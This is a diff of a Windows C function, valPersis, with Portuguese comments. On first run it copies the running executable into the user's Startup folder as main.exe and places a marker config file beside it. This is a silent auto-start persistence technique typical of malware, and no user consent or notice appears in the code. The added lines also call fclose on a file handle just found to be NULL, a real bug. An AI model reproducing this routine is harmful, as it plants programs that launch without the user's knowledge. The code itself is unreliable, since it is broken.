@@ -98,6 +98,7 @@ bool valPersis()
     int valor = 0;
 
     varsConf = fopen("config.cfg", "r");
+    
     if (!varsConf)
     {
         char currentPath[MAX_PATH];
@@ -106,6 +107,11 @@ bool valPersis()
 
         GetModuleFileName(NULL, currentPath, MAX_PATH);
 
+        fclose(varsConf);
+        varsConf = fopen("config.cfg", "w");
+        fprintf(varsConf, "pos=1\n");
+        fclose(varsConf);
+
         if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
         {
             snprintf(newPath, MAX_PATH, "%s\\main.exe", startupPath);
@@ -113,26 +119,10 @@ bool valPersis()
             {
                 CopyFile(currentPath, newPath, FALSE);
             }
+
+            snprintf(currentPath, MAX_PATH, "%s\\config.cfg", startupPath);
+            MoveFile("config.cfg", currentPath);
         }
-        varsConf = fopen("config.cfg", "w");
-        fprintf(varsConf, "pos=1\n");
-        fclose(varsConf);
-
-        if (fscanf(varsConf, "%[^=]=%d", chave, &valor) == 2)
-        {
-            fclose(varsConf);
-            if (valor == 1)
-            {
-                snprintf(newPath, MAX_PATH, "%s\\config.cfg", startupPath);
-                if (strcmp(currentPath, newPath) != 0)
-                {
-                    CopyFile(currentPath, newPath, FALSE);
-                }
-
-                remove("config.cfg");
-            }
-        }
-
         return false; // primeira execução
     }
     else
@@ -142,9 +132,10 @@ bool valPersis()
         {
             fclose(varsConf);
             if (valor == 1)
+            {
                 return true;
+            }
         }
-        fclose(varsConf);
     }
 
     return false;
